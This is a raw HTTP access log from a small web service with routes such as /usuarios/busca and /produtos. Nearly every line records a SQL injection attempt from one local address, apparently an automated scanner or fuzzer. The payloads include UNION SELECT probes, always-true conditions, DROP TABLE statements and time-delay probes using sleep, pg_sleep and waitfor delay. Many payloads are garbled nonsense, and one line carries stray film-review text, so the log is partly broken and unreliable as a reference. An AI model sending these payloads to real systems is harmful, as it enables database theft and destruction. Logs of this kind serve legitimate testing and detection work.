Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$,%20ly%20)%20'/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'Dbo'%20%3C%3E%20'8b2b111,0b0b111101010010101001110001010101000101000100111101111110101110101 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynot',%20)%20%3Ean/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20sybcharaby/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20tabctame%20and%20'i'%20=%20'1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1060%20)%20and%20(%209024%20=%209024 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alectame'%20)%20,%20and%20'C'='pe HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20LIcE%20';%20AND%20(SELECT%201)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,ly,%20)%20'/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys:%20)%20;1%20and%20'vevv'%20like%20'vevd HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,adechare%20)%20;'tayt'%20)%20=%201 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20tabltance%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@verseom/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charely)%20)%20valles%20tare%20talle HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20Lice%20table%20NAtE,%20)%20,%20(SELeCt%20(SELECT%201))%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20()%20,%20)%20,evertime%20(%20'1,1,1/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20S%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - DELETE /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test%22%20OR%20%221%22=%221%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20and%206537=dbms_pipe.receive_message(chr(76)%7C%7Cchr(116)%7C%7Cchr(117)%7C%7Cchr(65),5) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20where%202967%20=%202967 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20where%201140%20=%201140%20or%202367%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1))%20or%20sleep(5) HTTP/1.1
172.18.0.1 - DELETE /usuarios/testselect%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20and%20%22%25%22%20=%20%22%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20and%20(select%20*%20from%20(select(sleep(5)))fzno)%20and%20%22msbw%22=%22mswb HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20as%20ztjr%20where%205150%20=%205150%20union%20all%20select%20null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20as%20rxhe%20where%203838%20=%203838%20or%207417%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20and%203754%20=%20(%20select%20upper%20(%20xmltype%20(%20chr%20(%2060%20)%20%7C%7Cchr%20(%2058%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203754%20=%203754%20)%20then%201%20else%200%20end%20)%20from%20d)))) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20)%20as%20rcon%20where%208190%20=%208190%20or%205286%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1')))%20and%203707=(select%20count(*)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3)%20and%20((('xcwq'='xcwq HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-2007%25'%20)%20)%20union%20all%20select%207298,7298,7298 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%7C%7C%20(%20select%20'kgjk'%20where%203530%20=%203530%20and%203580%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20)%20and%203754%20=%20(%20select%20upper%20(%20xmltype%20(%20chr%20(%2060%20)%20%7C%7Cchr%20(%2058%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203754%20=%203754%20)%20then%201%20else%200%20end%20)%20f HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20as%20hfpq%20where%205288%20=%205288 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20as%20elnu%20where%205719%20=%205719%20or%208156%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%20)%20;%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-9876'%20)%20)%20as%20exyu%20where%205798%20=%205799%20or%205970%20=%205849%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20where%203971%20=%203971%20union%20all%20select%20null,null,null,null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /usuarios/testwaitfor%20delay%20'0:0:5'%20and%20%22lhcv%22%20=%20%22lhcv HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%7C%7C%20(%20select%20'tcfy'%20where%204546%20=%204546%20and%206969%20=%20(%20select%206969%20from%20pg_sleep%20(%205%20)%20)%20)%20%7C%7C' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20as%20cimd%20where%209608%20=%209608 HTTP/1.1
172.18.0.1 - DELETE /usuarios/testtllett1%20)%20as%20amyf%20where%206439%20=%206439 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20and%206537%20=%20dbms_pipe.receive_message%20(%20chr%20(%2076%20)%20%7C%7Cchr%20(%20116%20)%20%7C%7Cchr%20(%20117%20)%20%7C%7Cchr%20(%2065%20)%20,5%20) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20and%208514%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20and%20(%203814%20=%203814 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20where%201293%20=%201293%20and%208249%20=%208/*The%20positive%20horror/city%20Well-Disguid%20films%20during%20the%20world,%20a%20half%20any%20more%20of%20a%20real%20word.%20A%20lot%20of%20simply%20this%20would%20have%20been%20a%20fan%20of%20the%20lives.%20He%20was%20awfals%20by%20those%20choor%20ending%20the%20Show%20Yount.%20The%20story%20is%20sim HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20and%20exp%20(%20~%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%208190%20=%208190,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20x%20)%20)%20and%20(%20(%20'tnfm'%20like%20'tnfm%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%25'%20)%20)%20and%209198%20=%209198%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20)%20)%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char%20(%20122%20)%20+char%20(%20118%20)%20+char%20(%20122%20)%20+char%20(%201 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%29+%2C+usern%2Cteman HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+table_name%27+%29+%2C+DAME_SELt+%29+%40rdeX_VURS+%28+--+0b110t HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+Or+%22F%22%5E%3D%22 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verale_tembent+tamle_table_time+%27table+tame+%29+%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cnaber%3B+%29+varibs+tabelatebmysibetibcatmerictup+characker+5%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+table_name%27+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verale+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+%2C+SELECT+vErsion+%28+%29+%2C+Hornim_%2F%2A+lO%2A%2FOR+0x0+%29+%2A0x1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+S%27+ulem%3B%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+Table_name+%28+DVM%2F%2AI HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%28%2C+users%2Cversion+%28+%29+and+%27i%27+%3D+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verseoncmane+%28+%27DbO2%27%2C1%2C4+%29+%2C+%28+SELECT+%40%28+ELSE+ID+%28+1338+%29+%2C0x1%2C317 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+Table_name%27+%29+%2CCORD%27+%28+LIME+%28+1%2CASTELP+%29+--+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verseoncmant+ide+%28+%28SELECT+%28SELECT+%28SELECT+1%29%29%29+%29+iN HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmale_came_tem%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+by11%2C1+%29+%29+%29+%3B1%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+%2C+users%2Cversion%29+and+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+%2C+ULLEVJ+PR_SLEEPP_%29%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%28+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+Table_name+%28+Chr+%28+%271A HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmatecbumpant+tebpe+and+in%3B%3B1%3B+%3D+%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+%27ynom%27%2C+%29+%2C1%2C1+%29+%29+%3B1%3B+%28+select+1%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+usercameredom%27+%29+%3C%40%27+or+1+%3D+1+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LiKE+%273%27+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verseoncmane+%28+%28SELECT+3%29%29+%29+%2C%28SELECT+%28SELECT+%28SELECT+0%29%29%29+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscomand+2%29+FROM+iDar_table_table%27%3B HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SEM HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+%28+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SE HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+1+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SET+AND+%271%27+%3D+%271%27+or+%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SEm HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+S HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%22+OR+%221%22%3D%221%22+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%22+OR+%221%22%3D%221%23%22+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=declare+%40q+nvarchar+%28+200+%29+0x730065006c00650063+... HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27%7C%7C+%28+select+%27xbvz%27+from+dual+where+1632+%3D+1632+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+where+2190+%3D+2190+and+8189+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+where+4473+%3D+4437+rlike+%28+select+%28+case+when+%28+7689+%3D+7689+%29+then+1+else+0x28+end+%29+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+or+6793+%3D+%28+select+6793+from+pg_sleep+%28+5+%29+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+%29+%29+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29+and+%28+%28+%28+%27acml%27+like+%27acml HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+where+5455+%3D+5455+and+sleep+%28+5+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+where+3076+%3D+3076+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+or+8421+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+and+%28+%27csmu%27+%3D+%27csmu+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+where+5333+%3D+5333+or+9643+%3D+%28+select+count+%28+%2A+%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+where+1537+%3D+1537+and+%28+select+9067+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9067+%3D+9067%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.character_sets+group+by+x+%29+a+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+as+wsyv+where+8141+%3D+8141+and+6240+%3D+%28+%27qqpjq%27%7C%7C+%28+select+case+6240+when+6240+then+1+else+0+end+from+rdb%24database+%29+%7C%7C%27qzvzq%27+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+%29+or+4411+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+and+%28+%28+5200+%3D+5200 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%25%22+%29+%29+%29+and+6969+%3D+%28+select+6969+from+pg_sleep+%28+5+%29+%29+and+%28+%28+%28+%22%25%22+%3D+%22 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%5C.%3C1+or+1+%3D+1+--+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+as+skby+where+4269+%3D+4269+or+elt+%28+6272+%3D+6272%2Csleep+%28+5+%29+%29+%29+%7C%7C%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+%29+and+3715+in+%28+%28+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+3715+%3D+3715+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bchar+%28+113+%29+%2Bchar+%28+122+%29+%2Bchar+%28+118+%29+%2Bchar+%28+122+%29+%2Bchar+%28+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%25%27+%29+%29+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+gcrr+%29+%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=SeLECT+%2A+FroM+Users+whERe%2F%2A%2A%2FId%3D0o0x0B1+%2B%24%2B+%5COr+0B100X2+likE+%28SeleCt+%28SElECt+%28SELECt+1%29%29%29+Or+fALSE+%26%26+true+oR+0o0+Or+0+aND+TrUe+--+0B1o0B100%27P1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22%29+as+bovk+where+4176%3D4176+or+7427%3Ddbms_pipe.receive_message%28chr%28116%29%7C%7Cchr%2887%29%7C%7Cchr%2890%29%7C%7Cchr%28109%29%2C5%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%5Ck2b%28e1%2319z%3Efo%3Ewo-%60_zc53%5E%3C%2Af%3C%2A%2Fxh%28d-m~ge%3Dgc+e%5D_6%2A%29~%5Cn%7B~qg%3Ak_e%3E%24z21%3B_icv%25dua%5D-%3D6.be%3Bg%5Dt%23%2F%2F373%2F%7B%24%5Elsj%2Fc1%28gsv-%2F%3B+%2F7-%2B%21j1+%29+where+2483+%3D+2483 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+or+6793+%3D+%28+select+6793+from+pg_sleep+%28+5+%29+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+case+when+4537+%3D+8418+then+1+else+null+end+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+%28+case+when+%28+1412+%3D+5313+%29+then+1412+else+1412%2A+%28+select+1412+from+mysql.db+%29+end+%29+%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27%2B+%28+select+%27vbqo%27+where+5630+%3D+5630+procedure+analyse+%28+extractvalue+%28+9627%2Cconcat+%28+0x5c%2C+%28+benchmark+%28+5000000%2Cmd5+%28+0x4b774c75+%29+%29+%29+%29+%29+%2C1+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',1'%20)%20%3E%201%20/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1061%20)%20and%20(%201928%20=%201928 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20Lice%20table%20NAte%20) HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20(%20,%20useRs,gverpabp_rectaruly%20table%20anD%20THE%20=%201,SELECT%20(%20SELECT%20CHAR%20(%20113%20)%20+CHAR%20(%20113%20)%20+CHAR%20(%20113%20)%20+CHAR%20(%20112%20)%20+CHAR%20(%20120%20)%20+CHAR%20(%20109%20)%20+ChAR%20(%2010 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20table_schema,table_name%20FROM%20iname_1; HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20usercameredom'int','tablem'%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,alecture'%20)%20and%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20(%20table_samerial,name_nible,%20vible_NUME%20)%20AND%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',1%20)%20,1,1%20)%20)%20(%20'x HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@verseon,%20)%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20%7C%7C%20'Q'%20NoT%20LIKe%20'Q'%20--%201' HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3' HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charnly$)%20,%20abnchir%20)%201%20vrow/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20;1%20=%201 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20and%20'updat';like%20'ctad HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20userschart'lame%20)%20;@%3C@_rion%20sules HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20-%20Table_name,%20DRoM%20intor%20garnanere,%20whare_derat.@ban_tables%20)%20,@@S_%20)%20=%20' HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'yver,1,tabs%20when%20(%20143%20)%20,114%20)%20and%201%20)%20=%201 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20table_name'%20)%20from%20tubl_name_chir.;ch HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20Se HTTP/1.1
172.18.0.1 - GET /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - GET /produtos/testselect%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20and%20(%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20as%20gbkx%20where%205494%20=%205449 HTTP/1.1
172.18.0.1 - GET /produtos/test-6540'%20)%20where%205019%20=%205019%20or%20(%208459%20=%208459%20)%20*4906%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1))%20as%20bhdj%20where%204472=4472%20and%20(select%202*(if((select%20*%20from%20(select%20concat(0x7171706a71,(select%20(elt(3484=3484,1))),0x717a767a71,0x78))s),%208446744073709551610,%208446744073709551610)))%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20as%20qswu%20where%206377%20=%206377 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20where%209545%20=%209554%20and%209198%20=%209198%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1%20)%20where%202390%20=%202390 HTTP/1.1
